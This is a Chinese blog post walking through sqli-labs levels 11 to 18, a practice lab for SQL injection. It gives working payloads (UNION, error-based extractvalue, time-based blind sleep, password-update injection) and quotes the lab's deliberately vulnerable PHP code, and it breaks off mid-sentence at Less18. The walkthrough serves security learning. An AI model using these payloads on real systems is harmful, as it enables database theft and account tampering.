
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>sqli-labs教程(4) | likesoso - 随便写写</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <!-- Set render engine for 360 browser -->
  <meta name="renderer" content="webkit">
  <!-- No Baidu Siteapp-->
  <meta http-equiv="Cache-Control" content="no-siteapp"/>
  <meta name="description" content="Less11 简单的登录框，判断为post类型的注入。随便键入数据 1admin&#39;&#x2F;123456  根据报错： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near">
<meta property="og:type" content="article">
<meta property="og:title" content="sqli-labs教程(4)">
<meta property="og:url" content="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/index.html">
<meta property="og:site_name" content="likesoso - 随便写写">
<meta property="og:description" content="Less11 简单的登录框，判断为post类型的注入。随便键入数据 1admin&#39;&#x2F;123456  根据报错： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-1.jpg">
<meta property="og:image" content="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-2.jpg">
<meta property="og:image" content="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-3.jpg">
<meta property="og:image" content="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-4.jpg">
<meta property="og:image" content="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-5.jpg">
<meta property="og:image" content="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-6.jpg">
<meta property="og:image" content="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-7.jpg">
<meta property="og:image" content="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-8.jpg">
<meta property="og:image" content="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-9.jpg">
<meta property="og:image" content="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-10.jpg">
<meta property="og:image" content="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-11.png">
<meta property="og:image" content="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-12.png">
<meta property="article:published_time" content="2020-10-09T06:48:06.000Z">
<meta property="article:modified_time" content="2020-10-10T06:09:15.337Z">
<meta property="article:author" content="likesoso">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-1.jpg">
  
  
    <link rel="icon" href="/img/likesoso.jpg">
    <meta name="mobile-web-app-capable" content="yes">
    <!-- Add to homescreen for Chrome on Android -->    
    <link rel="icon" sizes="192x192" href="/img/likesoso.jpg">
    <!-- Add to homescreen for Safari on iOS -->
    <link rel="apple-touch-icon-precomposed" href="/img/likesoso.jpg">    
    <!-- Tile icon for Win8 (144x144 + tile color) -->
    <meta name="msapplication-TileImage" content="/img/likesoso.jpg">
    <meta name="msapplication-TileColor" content="#0e90d2">
  
  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
  
<script type="text/javascript">
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?10f2720e6f47d1b4a5ebc811df8dc361";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

<meta name="generator" content="Hexo 5.1.1"></head>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">likesoso - 随便写写</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">首页</a>
        
          <a class="main-nav-link" href="/archives">文章</a>
        
          <a class="main-nav-link" href="/about">关于</a>
        
      </nav>
      <!--
      <nav id="sub-nav">
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="likesoso.github.io">
        </form>
      </div>
      -->
    </div>
  </div>
</header>
    <div class="outer">
      <section id="main"><article id="post-sqli-labs教程-4" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/" class="article-date">
  <time datetime="2020-10-09T06:48:06.000Z" itemprop="datePublished">2020-10-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/sqli/">sqli</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      sqli-labs教程(4)
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="Less11"><a href="#Less11" class="headerlink" title="Less11"></a>Less11</h1><p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-1.jpg"></p>
<p>简单的登录框，判断为post类型的注入。随便键入数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;&#x2F;123456</span><br></pre></td></tr></table></figure>

<p>根据报错：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;123456&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>order by 加 union 判断回显后，构造poc：</p>
<p>爆库名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#39;+Union+Select+1,database()+#</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-2.jpg"></p>
<h1 id="Less12"><a href="#Less12" class="headerlink" title="Less12"></a>Less12</h1><p>跟Less11一样，只是不使用单引号触发，而是用<code>&quot;)</code>触发</p>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-3.jpg"></p>
<h1 id="Less13"><a href="#Less13" class="headerlink" title="Less13"></a>Less13</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123&#39;) or 1&#x3D;1 #		&#x2F;&#x2F;登陆成功</span><br><span class="line">123&#39;) or 1&#x3D;2 #		&#x2F;&#x2F;登陆失败</span><br></pre></td></tr></table></figure>
<p>order by 判断出有2个字段后，页面没有回显位。考虑使用extractvalue构造poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;123&#39;)+and+extractvalue(0x0a,concat(0x0a,(SELECT+schema_name+FROM+INFORMATION_SCHEMA.SCHEMATA+limit+4,1)))#&amp;passwd&#x3D;123456&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-4.jpg"></p>
<h1 id="Less14"><a href="#Less14" class="headerlink" title="Less14"></a>Less14</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123&quot; or 1&#x3D;1 #		       &#x2F;&#x2F;登陆成功</span><br><span class="line">123&quot; or 1&#x3D;2 #			&#x2F;&#x2F;登陆失败</span><br></pre></td></tr></table></figure>
<p>由此判断，提交的参数被双引号包裹了起来，其他的跟Less13一致，构造POC：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;123&quot;+and+extractvalue(0x0a,concat(0x0a,(SELECT+schema_name+FROM+INFORMATION_SCHEMA.SCHEMATA+limit+4,1)))#&amp;passwd&#x3D;123456&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-5.jpg"></p>
<h1 id="Less15"><a href="#Less15" class="headerlink" title="Less15"></a>Less15</h1><p>没有任何响应，构造poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#39; or sleep(5) #</span><br></pre></td></tr></table></figure>
<p>使用延时注入，这里有个产生了一个问题。我们查看源码后得到sql语句为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>
<p>如果我们采用上面的poc，生效的部分为：</p>
<p><code>SELECT username, password FROM users WHERE username=&#39;123&#39; or sleep(5)</code></p>
<p>很长时间没有响应、数据库一直在sleep，远远超过了5秒，达到了65s。</p>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-6.jpg"></p>
<p>经分析这个语句遍历了整个users表，每次都执行了or后面的sleep。导致users表中有多少行，sleep就被执行了多少次。</p>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-7.jpg"></p>
<p>这就是响应时间超长的原因，修改poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or sleep(5) #</span><br></pre></td></tr></table></figure>
<p>让where前半段可以查询到用户名admin，即可；构造poc</p>
<p>数据库长度：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;+and+if(length(database()&#x3D;8),sleep(5),1)#&amp;passwd&#x3D;123456&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-8.jpg"></p>
<p>其他的爆破exp如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：</span><br><span class="line">uname=admin&#x27;+and+if(left(database(),1)=&#x27;s&#x27;,sleep(5),1)<span class="comment">#&amp;passwd=123456&amp;submit=Submit</span></span><br><span class="line">爆破表名：</span><br><span class="line">uname=admin&#x27;+and+if(left(((<span class="keyword">select</span>+table_name+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="keyword">database</span>()+<span class="keyword">LIMIT</span>+<span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>)=<span class="string">&#x27;e&#x27;</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">#&amp;passwd=123456&amp;submit=Submit</span></span><br><span class="line">爆破列名：</span><br><span class="line">uname=<span class="keyword">admin</span><span class="string">&#x27;+and+if(left((select+column_name+from+information_schema.columns+where+table_name%3d&#x27;</span><span class="keyword">users</span><span class="string">&#x27;+and+table_schema+=+&#x27;</span><span class="keyword">security</span><span class="string">&#x27;+LIMIT+0,1),1)=&#x27;</span>i<span class="string">&#x27;,sleep(5),1)#&amp;passwd=123456&amp;submit=Submit</span></span><br><span class="line"><span class="string">爆破字段内容：</span></span><br><span class="line"><span class="string">uname=admin&#x27;</span><span class="keyword">and</span>+<span class="keyword">if</span>(<span class="keyword">left</span>((<span class="keyword">select</span>+<span class="keyword">id</span>+<span class="keyword">from</span>+<span class="keyword">users</span>+<span class="keyword">limit</span>+<span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)=<span class="string">&#x27;1&#x27;</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">#&amp;passwd=123456&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<h1 id="Less16"><a href="#Less16" class="headerlink" title="Less16"></a>Less16</h1><p>反复测试发现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123&quot;) or 1&#x3D;1 -- -		#登陆成功</span><br><span class="line">123&quot;) or 1&#x3D;2-- -		#登陆失败</span><br></pre></td></tr></table></figure>

<p>由此判断Less16跟Less15一致，只是用双引号包含了参数。将Less15中POC的单引号改成双引号即可。</p>
<h1 id="Less17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入"><a href="#Less17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入" class="headerlink" title="Less17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)"></a>Less17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</h1><p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-9.jpg"></p>
<p>各种尝试无果，查看源码后发现check_input()中使用了get_magic_quotes_gpc()函数对参数进行过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h2 id="check-in函数"><a href="#check-in函数" class="headerlink" title="check_in函数"></a>check_in函数</h2><p>限制长度、只取15个字符串<br>get_magic_quotes_gp()函数，对get、post、cookie传入数据中的单引号、双引号、反斜杠与NULL等字符添加\ 进行转义；当开启magic_quotes_gpc时，直接调用magic_quotes_gpc()返回为1，未开启返回为0</p>
<p>stripslashes()删除由 addslashes() 函数添加的反斜杠</p>
<p>ctype_digit()判断是否为数字，是数字返回1，不是返回0</p>
<p>mysql_real_escape_string(）转义sql语句中的特殊字符</p>
<p>intval() 整型转化</p>
<p>但是passwd参数并没有受到check_input()的保护:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname=check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>修改密码的逻辑：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@$sql=<span class="string">&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">#echo $sql;</span></span><br><span class="line"></span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  		</span><br><span class="line">		$row1 = $row[<span class="string">&#x27;username&#x27;</span>];  	</span><br><span class="line">		$update=<span class="string">&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;</span>;</span><br><span class="line">		mysql_query($update);</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>首先确保用户名存在，在去对passwd字段做update操作。且passwd传参的时候没有check_in()函数过滤。所以我们另username=admin，然后在passwd字段上做文章，构造POC如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">库名：</span><br><span class="line">uname=admin&amp;passwd=123&#x27;+and+extractvalue(0x0a,concat(0x0a,(<span class="keyword">SELECT</span>+schema_name+<span class="keyword">FROM</span>+INFORMATION_SCHEMA.SCHEMATA+<span class="keyword">limit</span>+<span class="number">0</span>,<span class="number">1</span>)))<span class="comment">#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-10.jpg"></p>
<h1 id="Less18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入"><a href="#Less18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入" class="headerlink" title="Less18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)"></a>Less18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</h1><p>可以看到，页面中有显示ip address、判断为http头注入</p>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-11.png"></p>
<p>但是伪造ip，之后页面回显依旧是127.0.0.1。这里可能是用的REMOTE_ADDR，导致无法伪造：</p>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-12.png"></p>
<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line">	$uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">	$passwd = check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">	$sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">	$result1 = mysql_query($sql);</span><br><span class="line">	$row1 = mysql_fetch_array($result1);</span><br><span class="line">		<span class="keyword">if</span>($row1)</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			$insert=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span>;</span><br><span class="line">			mysql_query($insert);</span><br><span class="line">			<span class="comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">			<span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .$uagent;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			print_r(mysql_error());			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">			<span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">			print_r(mysql_error());</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>不难发现，=</p>

      
      
  <div class="article-statement">
    <hr>  
    1.如果本文帮到了您，不妨点一下右下角的 <a>分享到</a> 按钮。<br>
    2.除非注明，本博文章均为原创，转载请以链接形式标明本文地址。<br>
    3.本博文章只代表博主当时的观点或结论，与博主公司没有任何关系。<br>
  </div>

    </div>
    
    <footer class="article-footer">
      
        <a data-url="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/" data-id="ckg3e0v3y000jv9s69dsu3atj" class="article-share-link">分享到</a>
      

      
        <a href="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/#disqus_thread" class="article-comment-link">评论</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2020/09/30/mailsender-faker/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">上一篇</strong>
      <div class="article-nav-title">mailsender_faker</div>
    </a>
  
</nav>

  
</article>


  <section id="comments">
    <div id="disqus_thread">
      <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    </div>
  </section>
</section>
      
      <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title">about</h3>
  <div class="widget">
    <ul>
      
      
        
        
          <div style="text-align: center;">
            <img src="/img/tuitui.jpg" style="width: 100%; max-width: 250px;">
          </div>
        
        <li>
          <a href="/img/tuitui.jpg" target="_blank">1. my cat</a>
        </li>
      
        
        
        <li>
          <a href="https://github.com/likesoso" target="_blank">2. 我的「github」</a>
        </li>
      
    </ul>
  </div>
</div>
  
    <div class="widget-wrap">
  <h3 class="widget-title">推荐文章</h3>
  <div class="widget">
    <ul>
      
      
        
        <li>
          <a href="/2020/09/03/近源渗透-1/" target="_blank">1. 近源渗透1</a>
        </li>
      
        
        <li>
          <a href="/2020/09/03/近源渗透-2/" target="_blank">2. 近源渗透2</a>
        </li>
      
        
        <li>
          <a href="/2020/09/03/近源渗透-3/" target="_blank">3. 近源渗透3</a>
        </li>
      
        
        <li>
          <a href="/2020/09/03/近源渗透-4/" target="_blank">4. 近源渗透4</a>
        </li>
      
    </ul>
  </div>
</div>
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Misc/">Misc</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/games/">games</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/mail/">mail</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/sqli/">sqli</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/src/">src</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/wifi/">wifi</a><span class="category-list-count">4</span></li></ul>
    </div>
  </div>

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">2020年 10月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">2020年 09月</a><span class="archive-list-count">13</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最近评论</h3>
    <div class="widget">
      <!-- 多说最新评论 start -->
      <div class="ds-recent-comments" data-num-items="5" data-show-avatars="0" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="70"></div>
      <!-- 多说最新评论 end -->
      <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
      <script type="text/javascript">
        var duoshuoQuery = {short_name:"shijiajie"};
        (function() {
          var ds = document.createElement('script');
          ds.type = 'text/javascript';ds.async = true;
          ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
          ds.charset = 'UTF-8';
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds);
        })();
      </script>
      <!-- 多说公共JS代码 end -->
    </div>
  </div>

  
</aside>
      
    </div>
    <footer id="footer">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
  </script>
  
  <div class="outer">
    <div id="footer-info" class="inner">
      Copyright &copy; 2012 - 2020 <a href="/" target="_blank">likesoso</a>.
      &nbsp;
      <span id="busuanzi_container_site_pv">
        总访问量 <a href="http://service.ibruce.info/" target="_blank"><span id="busuanzi_value_site_pv"></span></a> 次
      </span>
      <span id="busuanzi_container_site_uv">
        <a href="http://service.ibruce.info/" target="_blank"><span id="busuanzi_value_site_uv"></span></a> 人.
      </span>
      
    </div>
  </div>
</footer>

  </div>
  <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/archives" class="mobile-nav-link">文章</a>
  
    <a href="/about" class="mobile-nav-link">关于</a>
  
</nav>
  <!-- totop start -->
<div id="totop">
<a title="返回顶部"><img src="/img/scrollup.png"/></a>
</div>

<!-- totop end -->

<script>
  var disqus_shortname = 'likesoso';
  
  var disqus_url = 'http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<!-- 百度分享 start -->

<!-- 百度分享 end -->

